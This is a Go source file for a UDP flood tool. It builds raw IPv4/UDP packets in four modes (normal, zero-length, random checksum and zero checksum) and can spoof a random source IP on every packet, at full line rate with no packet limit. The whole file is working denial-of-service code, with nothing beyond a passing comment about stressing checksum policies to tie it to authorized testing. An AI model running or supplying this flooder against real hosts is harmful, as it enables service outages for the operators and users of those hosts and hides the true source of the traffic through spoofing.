// Package udpflood implements UDP-layer flood attacks.
//
// A raw AF_INET/SOCK_RAW/IPPROTO_RAW socket is used so the
// kernel handles routing and Ethernet framing.  We build the IPv4 header and
// the UDP datagram from scratch (saddr+daddr+proto+len prepended to the segment, then one's
// complement sum over the combined buffer).
//
// Four flood modes are supported:
//
//	Normal         — standard UDP with random 16-byte payload; correct checksum
//	ZeroLength     — 8-byte UDP header only (length=8, no payload)
//	RandomChecksum — payload present but checksum is a random 16-bit value
//	ZeroChecksum   — payload present; checksum field = 0x0000 (disabled, RFC 768)
package udpflood

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

const (
	udpFloodTag = "\x1b[95m[UDP]\x1b[0m" // light purple (bright magenta)

	udpPayloadSize = 16 // random payload bytes for Normal / RandomChecksum / ZeroChecksum
)

// Mode selects which UDP variant to flood with.
type Mode int

const (
	ModeNormal         Mode = iota // correct checksum, 16-byte random payload
	ModeZeroLength                 // 8-byte header only, no payload
	ModeRandomChecksum             // random (bad) checksum, 16-byte payload
	ModeZeroChecksum               // checksum=0 (disabled), 16-byte payload
)

func (m Mode) String() string {
	switch m {
	case ModeNormal:
		return "Normal"
	case ModeZeroLength:
		return "ZeroLength"
	case ModeRandomChecksum:
		return "RandomChecksum"
	case ModeZeroChecksum:
		return "ZeroChecksum"
	}
	return "unknown"
}

// rawSocket is satisfied by the platform-specific AF_INET implementation.
type rawSocket interface {
	Send(pkt []byte) error
	Close() error
}

// Flooder sends UDP packets in the chosen mode until Count packets are sent
// or Ctrl+C is pressed.
type Flooder struct {
	Interface    string
	Target       string // IPv4 address or hostname
	Port         uint16 // destination UDP port
	Mode         Mode
	Count        int  // 0 = unlimited
	Rate         int  // pps; 0 = full hardware speed
	RandomSource bool // spoof a random source IP every packet
}

// Run resolves the target, opens the raw socket, and floods.
func (f *Flooder) Run() error {
	dstIP, err := resolveIPv4(f.Target)
	if err != nil {
		return fmt.Errorf("target %q: %w", f.Target, err)
	}

	var srcIP [4]byte
	if !f.RandomSource {
		srcIP, err = interfaceIPv4(f.Interface)
		if err != nil {
			return fmt.Errorf("source IP on %s: %w (try --random-source)", f.Interface, err)
		}
	}

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface, dstIP)
	if err != nil {
		return err
	}
	defer sock.Close()

	var total int64

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total packets sent: %d\n", udpFloodTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", udpFloodTag, cur, cur-prev)
			prev = cur
		}
	}()

	src := "fixed source"
	if f.RandomSource {
		src = "random source"
	}
	if f.Count > 0 {
		fmt.Printf("%s Sending %d UDP %s packets → %s:%d (%s) — press Ctrl+C to stop.\n",
			udpFloodTag, f.Count, f.Mode, f.Target, f.Port, src)
	} else {
		fmt.Printf("%s Flooding %s:%d with UDP %s (%s) — press Ctrl+C to stop.\n",
			udpFloodTag, f.Target, f.Port, f.Mode, src)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()

	for {
		if f.Rate > 0 {
			if now := time.Now(); now.Before(next) {
				time.Sleep(next.Sub(now))
			}
			next = next.Add(interval)
		}

		if f.RandomSource {
			srcIP = randIPv4()
		}

		_ = sock.Send(buildPacket(srcIP, dstIP, f.Port, f.Mode))
		n := atomic.AddInt64(&total, 1)

		if f.Count > 0 && n >= int64(f.Count) {
			fmt.Printf("\n%s Done. Sent %d UDP %s packets to %s:%d.\n",
				udpFloodTag, n, f.Mode, f.Target, f.Port)
			return nil
		}
	}
}

// buildPacket constructs one IPv4/UDP packet for the given flood mode.
//
// Wire layout (no Ethernet — sent via AF_INET SOCK_RAW):
//
//	[0:20]        IPv4 header  v=4 IHL=5 proto=UDP(17) TTL=64
//	[20:28]       UDP header   sport dport length checksum
//	[28:44]       payload      (absent for ModeZeroLength)
//
// Pseudo-header checksum per RFC 768
// (saddr+daddr+zero+proto+udpLen prepended to UDP segment, then one's
// complement sum over the combined buffer).
func buildPacket(srcIP, dstIP [4]byte, dstPort uint16, mode Mode) []byte {
	var payload []byte
	if mode != ModeZeroLength {
		payload = make([]byte, udpPayloadSize)
		rand.Read(payload)
	}

	udpLen := uint16(8 + len(payload))

	// UDP segment (header + payload).
	udpSeg := make([]byte, int(udpLen))
	binary.BigEndian.PutUint16(udpSeg[0:2], randEphemeral())
	binary.BigEndian.PutUint16(udpSeg[2:4], dstPort)
	binary.BigEndian.PutUint16(udpSeg[4:6], udpLen)
	// udpSeg[6:8] = checksum; filled per mode:
	copy(udpSeg[8:], payload)

	switch mode {
	case ModeNormal, ModeZeroLength:
		binary.BigEndian.PutUint16(udpSeg[6:8], udpChecksum(srcIP, dstIP, udpSeg))
	case ModeRandomChecksum:
		binary.BigEndian.PutUint16(udpSeg[6:8], randU16())
	case ModeZeroChecksum:
		// 0x0000 means "no checksum computed" for IPv4 UDP (RFC 768).
		// Deliberately left as zero to stress checksum-enforcement policies.
	}

	// IPv4 header (20 bytes).
	ipLen := 20 + len(udpSeg)
	pkt := make([]byte, ipLen)
	pkt[0] = 0x45 // version=4, IHL=5
	binary.BigEndian.PutUint16(pkt[2:4], uint16(ipLen))
	binary.BigEndian.PutUint16(pkt[4:6], randU16()) // IP ID
	// pkt[6:8] = flags/frag = 0
	pkt[8] = 64 // TTL
	pkt[9] = 17 // protocol = UDP
	// pkt[10:12] = checksum, filled below
	copy(pkt[12:16], srcIP[:])
	copy(pkt[16:20], dstIP[:])
	binary.BigEndian.PutUint16(pkt[10:12], onesCompSum(pkt[:20]))
	copy(pkt[20:], udpSeg)

	return pkt
}

// udpChecksum computes the UDP checksum using the IPv4 pseudo-header,
// prepending saddr+daddr+proto+udpLen and checksumming the combined buffer.
func udpChecksum(srcIP, dstIP [4]byte, udpSeg []byte) uint16 {
	ph := make([]byte, 12+len(udpSeg))
	copy(ph[0:4], srcIP[:])
	copy(ph[4:8], dstIP[:])
	// ph[8] = 0 (zero byte)
	ph[9] = 17 // UDP protocol number
	binary.BigEndian.PutUint16(ph[10:12], uint16(len(udpSeg)))
	copy(ph[12:], udpSeg)
	return onesCompSum(ph)
}

// onesCompSum computes the RFC 791 one's complement checksum (IP/UDP/TCP/ICMP).
func onesCompSum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func resolveIPv4(target string) ([4]byte, error) {
	ip := net.ParseIP(target)
	if ip == nil {
		hosts, err := net.LookupHost(target)
		if err != nil || len(hosts) == 0 {
			return [4]byte{}, fmt.Errorf("cannot resolve")
		}
		ip = net.ParseIP(hosts[0])
	}
	v4 := ip.To4()
	if v4 == nil {
		return [4]byte{}, fmt.Errorf("must be an IPv4 address")
	}
	var a [4]byte
	copy(a[:], v4)
	return a, nil
}

func interfaceIPv4(ifaceName string) ([4]byte, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return [4]byte{}, err
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return [4]byte{}, err
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			if v4 := ipNet.IP.To4(); v4 != nil {
				var a [4]byte
				copy(a[:], v4)
				return a, nil
			}
		}
	}
	return [4]byte{}, fmt.Errorf("no IPv4 address on interface %s", ifaceName)
}

func randIPv4() [4]byte {
	var ip [4]byte
	rand.Read(ip[:])
	return ip
}

func randU16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}

// randEphemeral returns a random ephemeral source port in [32768, 60999].
func randEphemeral() uint16 {
	const (
		lo = 32768
		hi = 60999
	)
	return lo + randU16()%uint16(hi-lo+1)
}
